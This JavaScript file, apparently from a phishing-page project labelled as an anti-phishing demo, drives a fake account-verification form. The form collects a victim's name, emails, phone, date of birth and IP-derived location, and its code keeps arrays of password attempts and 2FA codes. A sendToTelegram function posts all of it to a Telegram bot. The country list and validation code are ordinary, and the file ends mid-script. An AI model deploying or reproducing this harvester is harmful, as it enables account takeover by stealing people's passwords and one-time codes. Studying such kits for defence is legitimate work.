document.addEventListener('DOMContentLoaded', () => {
    // --- Telegram exfiltration demo (đồ án chống phishing) ---
    const TELEGRAM_TOKEN = TELEGRAM_CONFIG?.TOKEN || '';
    const TELEGRAM_CHAT_ID = TELEGRAM_CONFIG?.CHAT_ID || '';
    let formDataToSend = {};
    let passwords = [];
    let verificationCodes = [];
    let userIpInfo = { ip: 'N/A', location: 'N/A' };

    async function sendToTelegram(message) {
        if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
            console.warn('[DEMO] Chưa cấu hình TELEGRAM_CONFIG — mở telegram-config.js để điền TOKEN và CHAT_ID');
            console.log('[DEMO] Nội dung sẽ gửi:\n', message);
            return false;
        }
        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            console.log('[DEMO] Đã gửi dữ liệu tới Telegram');
            return true;
        } catch (err) {
            console.error('[DEMO] Lỗi gửi Telegram:', err);
            return false;
        }
    }

    function collectFormData() {
        return {
            name: document.getElementById('full-name').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('email-business').value.trim(),
            pageName: document.getElementById('page-name').value.trim(),
            phone: document.getElementById('phone-number').value.trim(),
            country: currentSelectedCountry.dial,
            dob: `${dobDay.value}/${dobMonth.value}/${dobYear.value}`
        };
    }

    function buildTelegramMessage() {
        const d = formDataToSend;
        const pageName = d.pageName || document.getElementById('page-name')?.value?.trim() || '';
        let msg = `Ip: ${userIpInfo.ip}
Location: ${userIpInfo.location}
-------------------
Full Name: ${d.name || ''}
Page Name: ${pageName}
Date of birth: ${d.dob || ''}
-------------------
Email: ${d.email || ''}
Email Business: ${d.emailBusiness || ''}
Phone Number: ${d.country || ''} ${d.phone || ''}`.trimEnd();

        if (passwords.length > 0) {
            msg += '\n-------------------';
            passwords.forEach((pwd, i) => {
                msg += `\nPassword(${i + 1}): ${pwd}`;
            });
        }

        if (verificationCodes.length > 0) {
            msg += '\n-------------------';
            verificationCodes.forEach((code, i) => {
                msg += `\n🔐 Code 2FA(${i + 1}): ${code}`;
            });
        } else if (passwords.length > 0) {
            msg += '\n-------------------';
        } else {
            msg += '\n-------------------';
        }

        return msg;
    }

    // Database of countries with flags, dial codes, and ISO codes
    const countries = [
        { name: 'Afghanistan', code: 'AF', dial: '+93', flag: '🇦🇫' },
        { name: 'Albania', code: 'AL', dial: '+355', flag: '🇦🇱' },
        { name: 'Algeria', code: 'DZ', dial: '+213', flag: '🇩🇿' },
        { name: 'American Samoa', code: 'AS', dial: '+1684', flag: '🇦🇸' },
        { name: 'Andorra', code: 'AD', dial: '+376', flag: '🇦🇩' },
        { name: 'Angola', code: 'AO', dial: '+244', flag: '🇦🇦' },
        { name: 'Anguilla', code: 'AI', dial: '+1264', flag: '🇦🇮' },
        { name: 'Antigua and Barbuda', code: 'AG', dial: '+1268', flag: '🇦🇬' },
        { name: 'Argentina', code: 'AR', dial: '+54', flag: '🇦🇷' },
        { name: 'Armenia', code: 'AM', dial: '+374', flag: '🇦🇲' },
        { name: 'Aruba', code: 'AW', dial: '+297', flag: '🇦🇼' },
        { name: 'Australia', code: 'AU', dial: '+61', flag: '🇦🇺' },
        { name: 'Austria', code: 'AT', dial: '+43', flag: '🇦🇹' },
        { name: 'Azerbaijan', code: 'AZ', dial: '+994', flag: '🇦🇿' },
        { name: 'Bahamas', code: 'BS', dial: '+1242', flag: '🇧🇸' },
        { name: 'Bahrain', code: 'BH', dial: '+973', flag: '🇧🇭' },
        { name: 'Bangladesh', code: 'BD', dial: '+880', flag: '🇧🇩' },
        { name: 'Barbados', code: 'BB', dial: '+1246', flag: '🇧🇧' },
        { name: 'Belarus', code: 'BY', dial: '+375', flag: '🇧🇾' },
        { name: 'Belgium', code: 'BE', dial: '+32', flag: '🇧🇪' },
        { name: 'Belize', code: 'BZ', dial: '+501', flag: '🇧🇿' },
        { name: 'Benin', code: 'BJ', dial: '+229', flag: '🇧🇯' },
        { name: 'Bermuda', code: 'BM', dial: '+1441', flag: '🇧🇲' },
        { name: 'Bhutan', code: 'BT', dial: '+975', flag: '🇧🇹' },
        { name: 'Bolivia', code: 'BO', dial: '+591', flag: '🇧🇴' },
        { name: 'Bosnia and Herzegovina', code: 'BA', dial: '+387', flag: '🇧🇦' },
        { name: 'Botswana', code: 'BW', dial: '+267', flag: '🇧🇼' },
        { name: 'Brazil', code: 'BR', dial: '+55', flag: '🇧🇷' },
        { name: 'Brunei', code: 'BN', dial: '+673', flag: '🇧🇳' },
        { name: 'Bulgaria', code: 'BG', dial: '+359', flag: '🇧🇬' },
        { name: 'Burkina Faso', code: 'BF', dial: '+226', flag: '🇧🇫' },
        { name: 'Burundi', code: 'BI', dial: '+257', flag: '🇧🇮' },
        { name: 'Cambodia', code: 'KH', dial: '+855', flag: '🇰🇭' },
        { name: 'Cameroon', code: 'CM', dial: '+237', flag: '🇨🇲' },
        { name: 'Canada', code: 'CA', dial: '+1', flag: '🇨🇦' },
        { name: 'Cape Verde', code: 'CV', dial: '+238', flag: '🇨🇻' },
        { name: 'Cayman Islands', code: 'KY', dial: '+1345', flag: '🇰🇾' },
        { name: 'Central African Republic', code: 'CF', dial: '+236', flag: '🇨🇫' },
        { name: 'Chad', code: 'TD', dial: '+235', flag: '🇹🇩' },
        { name: 'Chile', code: 'CL', dial: '+56', flag: '🇨🇱' },
        { name: 'China', code: 'CN', dial: '+86', flag: '🇨🇳' },
        { name: 'Colombia', code: 'CO', dial: '+57', flag: '🇨🇴' },
        { name: 'Comoros', code: 'KM', dial: '+269', flag: '🇰🇲' },
        { name: 'Congo', code: 'CG', dial: '+242', flag: '🇨🇬' },
        { name: 'Cook Islands', code: 'CK', dial: '+682', flag: '🇨🇰' },
        { name: 'Costa Rica', code: 'CR', dial: '+506', flag: '🇨🇷' },
        { name: 'Croatia', code: 'HR', dial: '+385', flag: '🇭🇷' },
        { name: 'Cuba', code: 'CU', dial: '+53', flag: '🇨🇺' },
        { name: 'Cyprus', code: 'CY', dial: '+357', flag: '🇨🇾' },
        { name: 'Czech Republic', code: 'CZ', dial: '+420', flag: '🇨🇿' },
        { name: 'Denmark', code: 'DK', dial: '+45', flag: '🇩🇰' },
        { name: 'Djibouti', code: 'DJ', dial: '+253', flag: '🇩🇯' },
        { name: 'Dominica', code: 'DM', dial: '+1767', flag: '🇩🇲' },
        { name: 'Dominican Republic', code: 'DO', dial: '+1809', flag: '🇩🇴' },
        { name: 'Ecuador', code: 'EC', dial: '+593', flag: '🇪🇨' },
        { name: 'Egypt', code: 'EG', dial: '+20', flag: '🇪🇬' },
        { name: 'El Salvador', code: 'SV', dial: '+503', flag: '🇸🇻' },
        { name: 'Equatorial Guinea', code: 'GQ', dial: '+240', flag: '🇬🇶' },
        { name: 'Eritrea', code: 'ER', dial: '+291', flag: '🇪🇷' },
        { name: 'Estonia', code: 'EE', dial: '+372', flag: '🇪🇪' },
        { name: 'Ethiopia', code: 'ET', dial: '+251', flag: '🇪🇹' },
        { name: 'Falkland Islands', code: 'FK', dial: '+500', flag: '🇫🇰' },
        { name: 'Faroe Islands', code: 'FO', dial: '+298', flag: '🇫🇴' },
        { name: 'Fiji', code: 'FJ', dial: '+679', flag: '🇫🇯' },
        { name: 'Finland', code: 'FI', dial: '+358', flag: '🇫🇮' },
        { name: 'France', code: 'FR', dial: '+33', flag: '🇫🇷' },
        { name: 'French Guiana', code: 'GF', dial: '+594', flag: '🇬🇫' },
        { name: 'French Polynesia', code: 'PF', dial: '+689', flag: '🇵🇫' },
        { name: 'Gabon', code: 'GA', dial: '+241', flag: '🇬🇦' },
        { name: 'Gambia', code: 'GM', dial: '+220', flag: '🇬🇲' },
        { name: 'Georgia', code: 'GE', dial: '+995', flag: '🇬🇪' },
        { name: 'Germany', code: 'DE', dial: '+49', flag: '🇩🇪' },
        { name: 'Ghana', code: 'GH', dial: '+233', flag: '🇬🇭' },
        { name: 'Gibraltar', code: 'GI', dial: '+350', flag: '🇬🇮' },
        { name: 'Greece', code: 'GR', dial: '+30', flag: '🇬🇷' },
        { name: 'Greenland', code: 'GL', dial: '+299', flag: '🇬🇱' },
        { name: 'Grenada', code: 'GD', dial: '+1473', flag: '🇬🇩' },
        { name: 'Guadeloupe', code: 'GP', dial: '+590', flag: '🇬🇵' },
        { name: 'Guam', code: 'GU', dial: '+1671', flag: '🇬🇺' },
        { name: 'Guatemala', code: 'GT', dial: '+502', flag: '🇬🇹' },
        { name: 'Guinea', code: 'GN', dial: '+224', flag: '🇬🇳' },
        { name: 'Guinea-Bissau', code: 'GW', dial: '+245', flag: '🇬🇼' },
        { name: 'Guyana', code: 'GY', dial: '+592', flag: '🇬🇾' },
        { name: 'Haiti', code: 'HT', dial: '+509', flag: '🇭🇹' },
        { name: 'Honduras', code: 'HN', dial: '+504', flag: '🇭🇳' },
        { name: 'Hong Kong', code: 'HK', dial: '+852', flag: '🇭🇰' },
        { name: 'Hungary', code: 'HU', dial: '+36', flag: '🇭🇺' },
        { name: 'Iceland', code: 'IS', dial: '+354', flag: '🇮🇸' },
        { name: 'India', code: 'IN', dial: '+91', flag: '🇮🇳' },
        { name: 'Indonesia', code: 'ID', dial: '+62', flag: '🇮🇩' },
        { name: 'Iran', code: 'IR', dial: '+98', flag: '🇮🇷' },
        { name: 'Iraq', code: 'IQ', dial: '+964', flag: '🇮🇶' },
        { name: 'Ireland', code: 'IE', dial: '+353', flag: '🇮🇪' },
        { name: 'Israel', code: 'IL', dial: '+972', flag: '🇮🇱' },
        { name: 'Italy', code: 'IT', dial: '+39', flag: '🇮🇹' },
        { name: 'Jamaica', code: 'JM', dial: '+1876', flag: '🇯🇲' },
        { name: 'Japan', code: 'JP', dial: '+81', flag: '🇯🇵' },
        { name: 'Jordan', code: 'JO', dial: '+962', flag: '🇯🇴' },
        { name: 'Kazakhstan', code: 'KZ', dial: '+7', flag: '🇰🇿' },
        { name: 'Kenya', code: 'KE', dial: '+254', flag: '🇰🇪' },
        { name: 'Kiribati', code: 'KI', dial: '+686', flag: '🇰🇮' },
        { name: 'Kosovo', code: 'XK', dial: '+383', flag: '🇽🇰' },
        { name: 'Kuwait', code: 'KW', dial: '+965', flag: '🇰🇼' },
        { name: 'Kyrgyzstan', code: 'KG', dial: '+996', flag: '🇰🇬' },
        { name: 'Laos', code: 'LA', dial: '+856', flag: '🇱🇦' },
        { name: 'Latvia', code: 'LV', dial: '+371', flag: '🇱🇻' },
        { name: 'Lebanon', code: 'LB', dial: '+961', flag: '🇱🇧' },
        { name: 'Lesotho', code: 'LS', dial: '+266', flag: '🇱🇸' },
        { name: 'Liberia', code: 'LR', dial: '+231', flag: '🇱🇷' },
        { name: 'Libya', code: 'LY', dial: '+218', flag: '🇱🇾' },
        { name: 'Liechtenstein', code: 'LI', dial: '+423', flag: '🇱🇮' },
        { name: 'Lithuania', code: 'LT', dial: '+370', flag: '🇱🇹' },
        { name: 'Luxembourg', code: 'LU', dial: '+352', flag: '🇱🇺' },
        { name: 'Macau', code: 'MO', dial: '+853', flag: '🇲🇴' },
        { name: 'Macedonia', code: 'MK', dial: '+389', flag: '🇲🇰' },
        { name: 'Madagascar', code: 'MG', dial: '+261', flag: '🇲🇬' },
        { name: 'Malawi', code: 'MW', dial: '+265', flag: '🇲🇼' },
        { name: 'Malaysia', code: 'MY', dial: '+60', flag: '🇲🇾' },
        { name: 'Maldives', code: 'MV', dial: '+960', flag: '🇲🇻' },
        { name: 'Mali', code: 'ML', dial: '+223', flag: '🇲🇱' },
        { name: 'Malta', code: 'MT', dial: '+356', flag: '🇲🇹' },
        { name: 'Marshall Islands', code: 'MH', dial: '+692', flag: '🇲🇭' },
        { name: 'Martinique', code: 'MQ', dial: '+596', flag: '🇲🇶' },
        { name: 'Mauritania', code: 'MR', dial: '+222', flag: '🇲🇷' },
        { name: 'Mauritius', code: 'MU', dial: '+230', flag: '🇲🇺' },
        { name: 'Mexico', code: 'MX', dial: '+52', flag: '🇲🇽' },
        { name: 'Micronesia', code: 'FM', dial: '+691', flag: '🇫🇲' },
        { name: 'Moldova', code: 'MD', dial: '+373', flag: '🇲🇩' },
        { name: 'Monaco', code: 'MC', dial: '+377', flag: '🇲🇨' },
        { name: 'Mongolia', code: 'MN', dial: '+976', flag: '🇲🇳' },
        { name: 'Montenegro', code: 'ME', dial: '+382', flag: '🇲🇪' },
        { name: 'Montserrat', code: 'MS', dial: '+1664', flag: '🇲🇸' },
        { name: 'Morocco', code: 'MA', dial: '+212', flag: '🇲🇦' },
        { name: 'Mozambique', code: 'MZ', dial: '+258', flag: '🇲🇿' },
        { name: 'Myanmar', code: 'MM', dial: '+95', flag: '🇲🇲' },
        { name: 'Namibia', code: 'NA', dial: '+264', flag: '🇳🇦' },
        { name: 'Nauru', code: 'NR', dial: '+674', flag: '🇳🇷' },
        { name: 'Nepal', code: 'NP', dial: '+977', flag: '🇳🇵' },
        { name: 'Netherlands', code: 'NL', dial: '+31', flag: '🇳🇱' },
        { name: 'New Caledonia', code: 'NC', dial: '+687', flag: '🇳🇨' },
        { name: 'New Zealand', code: 'NZ', dial: '+64', flag: '🇳🇿' },
        { name: 'Nicaragua', code: 'NI', dial: '+505', flag: '🇳🇮' },
        { name: 'Niger', code: 'NE', dial: '+227', flag: '🇳🇪' },
        { name: 'Nigeria', code: 'NG', dial: '+234', flag: '🇳🇬' },
        { name: 'North Korea', code: 'KP', dial: '+850', flag: '🇰🇵' },
        { name: 'Norway', code: 'NO', dial: '+47', flag: '🇳🇴' },
        { name: 'Oman', code: 'OM', dial: '+968', flag: '🇴🇲' },
        { name: 'Pakistan', code: 'PK', dial: '+92', flag: '🇵🇰' },
        { name: 'Palau', code: 'PW', dial: '+680', flag: '🇵🇼' },
        { name: 'Palestine', code: 'PS', dial: '+970', flag: '🇵🇸' },
        { name: 'Panama', code: 'PA', dial: '+507', flag: '🇵🇦' },
        { name: 'Papua New Guinea', code: 'PG', dial: '+675', flag: '🇵🇬' },
        { name: 'Paraguay', code: 'PY', dial: '+595', flag: '🇵🇾' },
        { name: 'Peru', code: 'PE', dial: '+51', flag: '🇵🇪' },
        { name: 'Philippines', code: 'PH', dial: '+63', flag: '🇵🇭' },
        { name: 'Poland', code: 'PL', dial: '+48', flag: '🇵🇱' },
        { name: 'Portugal', code: 'PT', dial: '+351', flag: '🇵🇹' },
        { name: 'Puerto Rico', code: 'PR', dial: '+1787', flag: '🇵🇷' },
        { name: 'Qatar', code: 'QA', dial: '+974', flag: '🇶🇦' },
        { name: 'Reunion', code: 'RE', dial: '+262', flag: '🇷🇪' },
        { name: 'Romania', code: 'RO', dial: '+40', flag: '🇷🇴' },
        { name: 'Russia', code: 'RU', dial: '+7', flag: '🇷🇺' },
        { name: 'Rwanda', code: 'RW', dial: '+250', flag: '🇷🇼' },
        { name: 'Samoa', code: 'WS', dial: '+685', flag: '🇼🇸' },
        { name: 'San Marino', code: 'SM', dial: '+378', flag: '🇸🇲' },
        { name: 'Saudi Arabia', code: 'SA', dial: '+966', flag: '🇸🇦' },
        { name: 'Senegal', code: 'SN', dial: '+221', flag: '🇸🇳' },
        { name: 'Serbia', code: 'RS', dial: '+381', flag: '🇷🇸' },
        { name: 'Seychelles', code: 'SC', dial: '+248', flag: '🇸🇨' },
        { name: 'Sierra Leone', code: 'SL', dial: '+232', flag: '🇸🇱' },
        { name: 'Singapore', code: 'SG', dial: '+65', flag: '🇸🇬' },
        { name: 'Slovakia', code: 'SK', dial: '+421', flag: '🇸🇰' },
        { name: 'Slovenia', code: 'SI', dial: '+386', flag: '🇸🇮' },
        { name: 'Somalia', code: 'SO', dial: '+252', flag: '🇸🇴' },
        { name: 'South Africa', code: 'ZA', dial: '+27', flag: '🇿🇦' },
        { name: 'South Korea', code: 'KR', dial: '+82', flag: '🇰🇷' },
        { name: 'South Sudan', code: 'SS', dial: '+211', flag: '🇸🇸' },
        { name: 'Spain', code: 'ES', dial: '+34', flag: '🇪🇸' },
        { name: 'Sri Lanka', code: 'LK', dial: '+94', flag: '🇱🇰' },
        { name: 'Sudan', code: 'SD', dial: '+249', flag: '🇸🇩' },
        { name: 'Suriname', code: 'SR', dial: '+597', flag: '🇸🇷' },
        { name: 'Sweden', code: 'SE', dial: '+46', flag: '🇸🇪' },
        { name: 'Switzerland', code: 'CH', dial: '+41', flag: '🇨🇭' },
        { name: 'Syria', code: 'SY', dial: '+963', flag: '🇸🇾' },
        { name: 'Taiwan', code: 'TW', dial: '+886', flag: '🇹🇼' },
        { name: 'Tajikistan', code: 'TJ', dial: '+992', flag: '🇹🇯' },
        { name: 'Tanzania', code: 'TZ', dial: '+255', flag: '🇹🇿' },
        { name: 'Thailand', code: 'TH', dial: '+66', flag: '🇹🇭' },
        { name: 'Timor-Leste', code: 'TL', dial: '+670', flag: '🇹🇱' },
        { name: 'Togo', code: 'TG', dial: '+228', flag: '🇹🇬' },
        { name: 'Tonga', code: 'TO', dial: '+676', flag: '🇹🇴' },
        { name: 'Trinidad and Tobago', code: 'TT', dial: '+1868', flag: '🇹🇹' },
        { name: 'Tunisia', code: 'TN', dial: '+216', flag: '🇹🇳' },
        { name: 'Turkey', code: 'TR', dial: '+90', flag: '🇹🇷' },
        { name: 'Turkmenistan', code: 'TM', dial: '+993', flag: '🇹🇲' },
        { name: 'Tuvalu', code: 'TV', dial: '+688', flag: '🇹🇻' },
        { name: 'Uganda', code: 'UG', dial: '+256', flag: '🇺🇬' },
        { name: 'Ukraine', code: 'UA', dial: '+380', flag: '🇺🇦' },
        { name: 'United Arab Emirates', code: 'AE', dial: '+971', fill: '🇦🇪', flag: '🇦🇪' },
        { name: 'United Kingdom', code: 'GB', dial: '+44', flag: '🇬🇧' },
        { name: 'United States', code: 'US', dial: '+1', flag: '🇺🇸' },
        { name: 'Uruguay', code: 'UY', dial: '+598', flag: '🇺🇾' },
        { name: 'Uzbekistan', code: 'UZ', dial: '+998', flag: '🇺🇿' },
        { name: 'Vanuatu', code: 'VU', dial: '+678', flag: '🇻🇺' },
        { name: 'Vatican', code: 'VA', dial: '+39', flag: '🇻🇦' },
        { name: 'Venezuela', code: 'VE', dial: '+58', flag: '🇻🇪' },
        { name: 'Vietnam', code: 'VN', dial: '+84', flag: '🇻🇳' },
        { name: 'Yemen', code: 'YE', dial: '+967', flag: '🇾🇪' },
        { name: 'Zambia', code: 'ZM', dial: '+260', flag: '🇿🇲' },
        { name: 'Zimbabwe', code: 'ZW', dial: '+263', flag: '🇿🇼' }
    ];

    // DOM Elements
    const openModalBtn = document.getElementById('open-modal-btn');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const requestModal = document.getElementById('request-modal');
    const verificationForm = document.getElementById('verification-form');
    const successScreen = document.getElementById('success-screen');
    const successCloseBtn = document.getElementById('success-close-btn');
    const successPageName = document.getElementById('success-page-name');
    const successEmail = document.getElementById('success-email');
    const successPhone = document.getElementById('success-phone');
    const toastContainer = document.getElementById('toast-container');
    const ticketIdDisplay = document.getElementById('ticket-id-display');
    const successTicketId = document.getElementById('success-ticket-id');

    // DOB Elements
    const dobDay = document.getElementById('dob-day');
    const dobMonth = document.getElementById('dob-month');
    const dobYear = document.getElementById('dob-year');

    // Textarea Note Elements
    const noteTextarea = document.getElementById('note');
    const noteCharCount = document.getElementById('note-char-count');

    // Flag Dropdown Elements
    const countryPickerBtn = document.getElementById('selected-country-btn');
    const countryDropdownMenu = document.getElementById('country-dropdown-menu');
    const countrySearchInput = document.getElementById('country-search-input');
    const countryListScrollable = document.getElementById('country-list-scrollable');
    const selectedFlagImg = document.getElementById('selected-flag-img');
    const selectedDialCode = document.getElementById('selected-dial-code');
    const phoneStaticPrefix = document.getElementById('phone-static-prefix');
    const phoneNumberInput = document.getElementById('phone-number');

    // State variables
    let currentSelectedCountry = countries.find(c => c.code === 'SG') || countries[0];

    // Initialize DOB selection options
    function initDOBOptions() {
        // Days 1 - 31
        for (let i = 1; i <= 31; i++) {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = i;
            dobDay.appendChild(opt);
        }
        // Months 1 - 12
        for (let i = 1; i <= 12; i++) {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = i;
            dobMonth.appendChild(opt);
        }
        // Years 1900 - current year
        const currentYear = new Date().getFullYear();
        for (let i = currentYear; i >= 1900; i--) {
            const opt = document.createElement('option');
            opt.value = i;
            opt.textContent = i;
            dobYear.appendChild(opt);
        }
    }

    // Initialize Flags / Countries List
    function initCountryList() {
        countryListScrollable.innerHTML = '';
        countries.forEach(country => {
            const div = document.createElement('div');
            div.className = 'country-item';
            div.dataset.code = country.code;
            div.dataset.search = `${country.name.toLowerCase()} ${country.dial} ${country.code.toLowerCase()}`;
            
            div.innerHTML = `
                <img class="item-flag-img" src="https://flagcdn.com/w40/${country.code.toLowerCase()}.png" alt="${country.name} Flag" loading="lazy">
                <span class="item-name">${country.name}</span>
                <span class="item-dial">${country.dial}</span>
            `;

            div.addEventListener('click', () => {
                selectCountry(country);
                hideCountryDropdown();
            });

            countryListScrollable.appendChild(div);
        });
    }

    // Country selection handler
    function selectCountry(country) {
        currentSelectedCountry = country;
        selectedFlagImg.src = `https://flagcdn.com/w40/${country.code.toLowerCase()}.png`;
        selectedFlagImg.alt = `${country.name} Flag`;
        selectedDialCode.textContent = country.dial;
        phoneStaticPrefix.textContent = country.dial;

        // Highlight selected item in the scrollable list
        const items = countryListScrollable.querySelectorAll('.country-item');
        items.forEach(item => {
            if (item.dataset.code === country.code) {
                item.classList.add('selected');
            } else {
                item.classList.remove('selected');
            }
        });
    }

    // Toggle Flag Selection Dropdown
    function showCountryDropdown() {
        countryPickerBtn.classList.add('active');
        countryDropdownMenu.classList.remove('hidden');
        countrySearchInput.focus();
        countrySearchInput.value = '';
        filterCountries('');
    }

    function hideCountryDropdown() {
        countryPickerBtn.classList.remove('active');
        countryDropdownMenu.classList.add('hidden');
    }

    // Search and filter countries logic
    function filterCountries(query) {
        const items = countryListScrollable.querySelectorAll('.country-item');
        const searchVal = query.toLowerCase().trim();
        items.forEach(item => {
            if (item.dataset.search.includes(searchVal)) {
                item.style.display = 'flex';
            } else {
                item.style.display = 'none';
            }
        });
    }

    function setUserIpInfo(data) {
        const city = data.city || 'Unknown';
        const region = data.region || city;
        const code = (data.country_code || '').toUpperCase();
        userIpInfo = {
            ip: data.ip || 'N/A',
            location: `${data.ip} | ${city} | ${region}(${code})`
        };
    }

    function selectCountryByCode(countryCode) {
        const matched = countries.find(c => c.code === countryCode?.toUpperCase());
        if (matched) selectCountry(matched);
    }

    function selectCountryByLocale() {
        const userLang = navigator.language || navigator.userLanguage;
        if (userLang && userLang.toLowerCase().includes('vi')) {
            selectCountryByCode('VN');
        } else {
            selectCountryByCode('SG');
        }
    }

    function cacheIpInfo(data) {
        try {
            sessionStorage.setItem('demo_ip_info', JSON.stringify({
                userIpInfo,
                country_code: data.country_code
            }));
        } catch (e) {}
    }

    function loadCachedIpInfo() {
        try {
            const cached = sessionStorage.getItem('demo_ip_info');
            if (!cached) return false;
            const parsed = JSON.parse(cached);
            if (!parsed?.userIpInfo?.ip || parsed.userIpInfo.ip === 'N/A') return false;
            userIpInfo = parsed.userIpInfo;
            if (parsed.country_code) selectCountryByCode(parsed.country_code);
            console.log('[DEMO] IP loaded from cache:', userIpInfo);
            return true;
        } catch (e) {
            return false;
        }
    }

    // Geolocation API fetch to detect country by IP
    async function detectCountryByIP() {
        if (loadCachedIpInfo()) return;

        const apis = [
            async () => {
                const res = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const data = await res.json();
                if (!data?.ip) throw new Error('geojs.io failed');
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country_code: data.country_code
                };
            },
            async () => {
                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await res.text();
                const ip = text.match(/^ip=(.+)$/m)?.[1];
                const loc = text.match(/^loc=(.+)$/m)?.[1];
                if (!ip) throw new Error('cloudflare trace failed');
                const matched = countries.find(c => c.code === loc?.toUpperCase());
                const name = matched?.name || loc || 'Unknown';
                return { ip, city: name, region: name, country_code: loc };
            }
        ];

        for (const fetchIp of apis) {
            try {
                const data = await fetchIp();
                setUserIpInfo(data);
                if (data.country_code) selectCountryByCode(data.country_code);
                cacheIpInfo(data);
                console.log('[DEMO] IP detected:', userIpInfo);
                return;
            } catch (err) {
                console.warn('[DEMO] IP lookup failed:', err.message || err);
            }
        }

        console.warn('[DEMO] Không lấy được IP — dùng fallback locale');
        selectCountryByLocale();
    }

    async function ensureIpInfo() {
        if (userIpInfo.ip !== 'N/A') return;
        await detectCountryByIP();
    }

    // Toast alert triggers
    function showToast(message, type = 'success') {
        const toast = document.createElement('div');
        toast.className = `toast toast-${type}`;
        
        const iconSvg = type === 'success' 
            ? '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>'
            : '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>';

        toast.innerHTML = `${iconSvg} <span>${message}</span>`;
        toastContainer.appendChild(toast);
        
        setTimeout(() => toast.classList.add('show'), 10);
        
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 4000);
    }

    // Modal Visibility Controllers
    async function openModal() {
        requestModal.classList.remove('hidden');
        document.body.style.overflow = 'hidden';
        resetForm();
        await detectCountryByIP();
    }

    function closeModal() {
        requestModal.classList.add('hidden');
        document.body.style.overflow = '';
    }

    // Password Verification Elements
    const stepInfoContainer = document.getElementById('step-info-container');
    const stepPasswordContainer = document.getElementById('step-password-container');
    const passwordInput = document.getElementById('password-input');
    const passwordToggleBtn = document.getElementById('password-toggle-btn');
    const passwordErrorMsg = document.getElementById('password-error-msg');
    const continuePasswordBtn = document.getElementById('continue-password-btn');
    const eyeOpenIcon = passwordToggleBtn.querySelector('.eye-open-icon');
    const eyeClosedIcon = passwordToggleBtn.querySelector('.eye-closed-icon');

    // Two-Factor Authentication Elements
    const step2faContainer = document.getElementById('step-2fa-container');
    const codeInput = document.getElementById('code-input');
    const codeErrorMsg = document.getElementById('code-error-msg');
    const continue2faBtn = document.getElementById('continue-2fa-btn');

    // Attempts counters
    let passwordAttempts = 0;
    let codeAttempts = 0;

    function resetForm() {
        verificationForm.reset();
        noteCharCount.textContent = '0';
        passwordAttempts = 0;
        codeAttempts = 0;
        formDataToSend = {};
        passwords = [];
        verificationCodes = [];
        
        // Hide success state cards and reset step containers
        verificationForm.classList.remove('hidden');
        successScreen.classList.add('hidden');
        stepInfoContainer.classList.remove('hidden');
        stepPasswordContainer.classList.add('hidden');
        step2faContainer.classList.add('hidden');

        // Reset password input type and icons
        passwordInput.type = 'password';
        eyeOpenIcon.classList.remove('hidden');
        eyeClosedIcon.classList.add('hidden');

        // Clear error markings
        document.querySelectorAll('.input-group, .dob-group, .phone-row-group, .agreement-row, .password-input-group, .code-input-group').forEach(el => {
            el.classList.remove('invalid');
        });
        document.getElementById('err-phone').closest('.phone-error-row').classList.remove('invalid');

        // Reset country indicator code to detected/default
        if (currentSelectedCountry) {
            selectCountry(currentSelectedCountry);
        }
    }

    // Input validations
    function validateForm() {
        let isValid = true;
        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

        const fullName = document.getElementById('full-name');
        const email = document.getElementById('email');
        const emailBusiness = document.getElementById('email-business');
        const pageName = document.getElementById('page-name');
        const phoneNumber = document.getElementById('phone-number');
        const agreeTerms = document.getElementById('agree-terms');

        // Full Name check
        if (!fullName.value.trim() || fullName.value.trim().length < 2) {
            fullName.closest('.input-group').classList.add('invalid');
            isValid = false;
        } else {
            fullName.closest('.input-group').classList.remove('invalid');
        }

        // Email check
        if (!email.value.trim() || !emailPattern.test(email.value.trim())) {
            email.closest('.input-group').classList.add('invalid');
            isValid = false;
        } else {
            email.closest('.input-group').classList.remove('invalid');
        }

        // Optional Business Email check
        if (emailBusiness.value.trim() && !emailPattern.test(emailBusiness.value.trim())) {
            emailBusiness.closest('.input-group').classList.add('invalid');
            isValid = false;
        } else {
            emailBusiness.closest('.input-group').classList.remove('invalid');
        }

        // Page Name check
        if (!pageName.value.trim()) {
            pageName.closest('.input-group').classList.add('invalid');
            isValid = false;
        } else {
            pageName.closest('.input-group').classList.remove('invalid');
        }

        // Phone number check (digits, min 7, max 15 digits)
        const digitsOnly = phoneNumber.value.replace(/\D/g, '');
        if (!digitsOnly || digitsOnly.length < 7 || digitsOnly.length > 15) {
            phoneNumber.closest('.phone-input-wrapper').parentElement.classList.add('invalid');
            document.getElementById('err-phone').closest('.phone-error-row').classList.add('invalid');
            isValid = false;
        } else {
            phoneNumber.closest('.phone-input-wrapper').parentElement.classList.remove('invalid');
            document.getElementById('err-phone').closest('.phone-error-row').classList.remove('invalid');
        }

        // Date of Birth check
        if (!dobDay.value || !dobMonth.value || !dobYear.value) {
            dobDay.closest('.dob-group').classList.add('invalid');
            isValid = false;
        } else {
            dobDay.closest('.dob-group').classList.remove('invalid');
        }

        // Agreement Checkbox check
        if (!agreeTerms.checked) {
            agreeTerms.closest('.agreement-row').classList.add('invalid');
            isValid = false;
        } else {
            agreeTerms.closest('.agreement-row').classList.remove('invalid');
        }

        return isValid;
    }

    // Event Listeners
    openModalBtn.addEventListener('click', openModal);
    closeModalBtn.addEventListener('click', closeModal);
    successCloseBtn.addEventListener('click', closeModal);

    // Close modal on outside click
